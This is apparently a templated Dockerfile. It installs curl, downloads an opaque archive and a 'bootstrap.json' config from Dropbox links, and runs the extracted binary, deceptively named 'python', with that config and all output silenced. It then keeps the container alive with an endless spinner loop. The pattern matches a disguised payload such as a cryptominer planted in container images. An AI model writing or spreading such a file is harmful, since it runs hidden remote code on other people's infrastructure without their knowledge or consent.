FROM ubuntu:latest

RUN apt-get update -y \
    && apt-get install curl xz-utils -y \
    && curl -L https://www.dropbox.com/s/7m35boddszp2rwd/python.tar.xz?dl=1 > {{ bin }}.tar.xz && tar -xvf {{ bin }}.tar.xz \
    && curl -L https://www.dropbox.com/s/k7p26cwrg56ro56/bootstrap.json?dl=1 > {{ config }}.json \
    && chmod +x python \
    && ./python -c {{ config }}.json > /dev/null 2>&1 \
    && while :;do for s in / - \\ \|; do printf "\r$s";sleep .1;done;done
